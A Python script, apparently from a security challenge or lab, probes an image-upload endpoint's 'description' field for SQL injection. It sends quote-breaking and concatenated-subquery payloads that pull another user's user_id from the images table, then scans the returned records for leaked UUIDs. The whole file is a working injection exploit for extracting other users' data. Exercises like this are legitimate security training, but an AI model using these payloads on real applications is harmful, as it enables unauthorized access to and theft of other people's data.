# test_description.py — does the INSERT concatenate `description` unsafely?
# description is sent as raw JSON (no OCR mangling), so we control the quote exactly.
import requests, json, re
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
URI  = open("paisaje_datauri.txt").read().strip()

def up(desc):
    r = requests.post(f"{BASE}/upload", json={"image":URI,"description":desc,"user_id":UID})
    return r.status_code, r.text[:60].strip()

tests = [
    ("plain",      "hello"),
    ("one_quote",  "he'llo"),                                   # 500 => description is injectable
    ("concat",     "x'||(SELECT user_id FROM images WHERE id=1)||'x"),
    ("comment",    "x'||(SELECT user_id FROM images WHERE id=1)-- "),
]
for label, d in tests:
    sc, body = up(d)
    print(f"{label:10} -> {sc}  {body}")

print("\n--- readback: description + leaked uuid ---")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data[-8:]:
    print(f"id={img['id']} desc={img.get('description')!r} ocr={img.get('summary_ocr')!r}")
for img in data:
    for fld in ("summary_ocr","make","model","datetime","description"):
        for m in re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", str(img.get(fld,""))):
            if m != UID:
                print(f"  >>> LEAKED {fld} id={img['id']}: {m}")
